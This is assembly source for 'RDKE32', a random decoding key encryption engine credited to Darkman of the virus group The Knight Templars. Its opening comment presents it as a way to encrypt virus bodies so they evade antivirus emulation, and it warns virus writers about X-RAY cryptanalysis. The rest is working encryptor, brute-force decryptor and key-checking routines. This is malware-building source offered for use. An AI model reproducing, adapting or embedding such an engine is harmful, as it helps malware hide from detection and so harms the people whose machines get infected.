comment *
                      ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
                     ﬂﬂﬂ€€€€€€ ‹‹ ﬂﬂﬂ  ﬂﬂﬂ ‹‹‹ €€€€€€ﬂﬂﬂ
                         ±€€€€ €€€€€€   €€€€€€ €€€€∞
                          €€€€ €€€€€€  ≤€€€€€  €€€€
                          €€€€ ﬂ€€€€± ‹€€€€≤   €€€€
                         ∞€€€€  €€€€€ﬂ€€€€ﬂ    €€€€
                         ±€€€€  €€€€≤  €€‹‹    €€€€∞
           ‹‹‹‹‹‹‹‹‹‹‹‹‹ ≤€€€€  €€€€±  €€€€≤‹  €€€€± ‹‹‹‹‹‹‹‹‹‹‹‹
          €              €€€€€  €€€€≤  ≤€€€€€∞ €€€€≤             €
          €              €€€€€ ‹€€€€€   ≤€€€€≤ €€€€€             €
          ﬂ‹             ﬂﬂﬂﬂﬂ ﬂﬂﬂﬂ       ﬂﬂﬂﬂ ﬂﬂﬂﬂﬂ            ‹ﬂ
           ‹ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ˛The Knight Templars˛ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ‹
           €                                                    €
           €  Random Decoding Key Engine 32-bit v 1.0 [RDKE32]  €
           €                       Code by                      €
           €                     Darkman/TKT                    €
           €                                                    €
            ﬂ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ﬂ


  Do not use this engine to encrypt known plaintext such as the actual virus
  code. It is possible to decrypt known plaintext encrypted with this
  engine using the X-RAY technique, also known as cryptanalysis. You can read
  more about this technique in "Detecting oh, roughly every polymorphic engine
  out there", an article by Rhincewind/VLAD, published in VLAD Magazine issue
  4. Billy Belcebu/iKx did this mistake in Win32.Legacy using his Internal
  ENCryptor v 1.0 [iENC], a Random Decoding Key (RDK) engine using a 8-bit
  eXclusive OR (XOR) algorithm to encrypt the actual virus in 19 different
  blocks.

  Length of Random Decoding Key Engine 32-bit v 1.0 [RDKE32]: 171 bytes.
*

hash_size               equ     (0a0h/08h)

_RDKE32Encrypt  struc
        _lpHash                                 dd      ?
        _lpBuffer                               dd      ?
        _dwNumberOfBytesToHashAndEncrypt        dd      ?
        _dwSecurityLevel                        dd      ?
                ends

_RDKE32Decrypt  struc
        _lpHash                         dd      ?
        _lpBuffer                       dd      ?
        _dwNumberOfBytesToDecrypt       dd      ?
                ends

_pushad struc
        _edi    dd      ?
        _esi    dd      ?
        _ebp    dd      ?
        _esp    dd      ?
        _ebx    dd      ?
        _edx    dd      ?
        _ecx    dd      ?
        _eax    dd      ?
        ends

rdke32_begin:
; RDKE32Encrypt
;
;
; The RDKE32Encrypt function creates a hash and encrypts data.
;
;   VOID RDKE32Encrypt(
;     LPVOID lpHash  // data buffer to receive hash
;     LPVOID lpBuffer  // data buffer of data to hash and encrypt
;     DWORD dwNumberOfBytesToHashAndEncrypt  // number of bytes to hash and
;                                            // encrypt
;     DWORD dwSecurityLevel  // security level
;   );
;
; Parameters
; lpHash
;   [out] Pointer to the buffer that receives the hash.
; lpBuffer
;   [out] Pointer to the buffer containing the data to be hashed and encrypted.
; dwNumberOfBytesToHashAndEncrypt
;   [in] Specifies the number of bytes to be hashed and encrypted.
; dwSecurityLevel
;   [in] Specifies the security level of the encryption. The higher it is the
;   longer it will take for RDKE32Decrypt to bruteforce and decrypt the
;   encrypted data.
;
; Return Values
; This function does not return a value.

RDKE32Encrypt   proc                    ; Random Decoding Key Engine 32-bit
                                        ; v 1.00 [RDKE32] encryptor
        pushad
        mov     edi,[esp._lpHash+size _pushad+04h]
                                        ; Pointer to the buffer that receives
                                        ; the hash
        mov     ebx,[esp._lpBuffer+size _pushad+04h]
                                        ; Pointer to the buffer containing the
                                        ; data to be hashed and encrypted
        mov     ecx,[esp._dwNumberOfBytesToHashAndEncrypt+size _pushad+04h]
                                        ; Specifies the number of bytes to be
                                        ; hashed and encrypted
        mov     eax,[esp._dwSecurityLevel+size _pushad+04h]
                                        ; Specifies the security level

        call    SHA1, edi, ecx, ebx
insecure_key:
        call    GetRandomNumberWithinRange
        call    test_key_security
        jz      insecure_key

        call    cryptor
        popad

        ret     size _RDKE32Encrypt
                endp

; RDKE32Decrypt
;
;
; The RDKE32Decrypt function creates a hash and encrypts data.
;
;   VOID RDKE32Decrypt(
;     LPVOID lpHash  // data buffer of hash
;     LPVOID lpBuffer  // data buffer of data to decrypt
;     DWORD dwNumberOfBytesToDecrypt  // number of bytes to decrypt
;   );
;
; Parameters
; lpHash
;   [in] Pointer to the buffer containing the hash.
; lpBuffer
;   [out] Pointer to the buffer containing the data to decrypted.
; dwNumberOfBytesToDecrypt
;   [in] Specifies the number of bytes to be decrypted.
;
; Return Values
; This function does not return a value.

RDKE32Decrypt   proc                    ; Random Decoding Key Engine 32-bit
                                        ; v 1.00 [RDKE32] decryptor
        pushad
        mov     edi,[esp._lpHash+size _pushad+04h]
                                        ; Pointer to the buffer of the hash
        mov     ebx,[esp._lpBuffer+size _pushad+04h]
                                        ; Pointer to the buffer containing the
                                        ; data to be decrypted
        mov     ecx,[esp._dwNumberOfBytesToDecrypt+size _pushad+04h]
                                        ; Specifies the number of bytes to be
                                        ; decrypted
        sub     esp,hash_size

        mov     esi,esp                 ; ESI = pointer to the hash
        xor     edx,edx
bruteforce_loop:
        inc     edx                     ; EDX = 32-bit encryption/decryption
                                        ; key
        call    test_key_security
        jz      bruteforce_loop

        call    cryptor

        call    SHA1, esi, ecx, ebx

        pushad
        push    (hash_size/04h)
        pop     ecx
        rep     cmpsd                   ; Succesfully decrypted the buffer to
                                        ; be decrypted?
        popad
        je      RDKE32Decrypt_exit

        call    cryptor

        jmp     bruteforce_loop
RDKE32Decrypt_exit:
        add     esp,hash_size
        popad

        ret     size _RDKE32Decrypt
                endp

test_key_security       proc            ; Test the security of the 32-bit key
        pushad

        test    eax,eax                 ; Insecure key?
        jz      test_key_exit

        push    03h
        pop     ecx
test_key_loop:
        mov     eax,edx                 ; EDX = 32-bit encryption/decryption
                                        ; key
        mov     ebx,ecx
_test_key_loop:
        rol     eax,08h

        test    al,dl
        jz      test_next_key

        cmp     al,dl                   ; Insecure key?
        je      test_key_exit
test_next_key:
        dec     ebx
        jnz     _test_key_loop

        rol     edx,08h

        loop    test_key_loop

        inc     ecx                     ; Secure key
test_key_exit:
        popad

        ret
                        endp

cryptor proc                            ; 32-bit encryptor/decryptor
        pushad
crypt_loop:
        inc     ecx

        test    dl,dl                   ; Insecure key?
        jz      dont_crypt

        dec     ecx

        xor     [ebx],dl
        inc     ebx
dont_crypt:
        rol     edx,08h

        loop    crypt_loop
        popad

        ret
        endp

                db      ' [RDKE32] '
rdke32_end:
rdke32_size     equ     (rdke32_end-rdke32_begin)
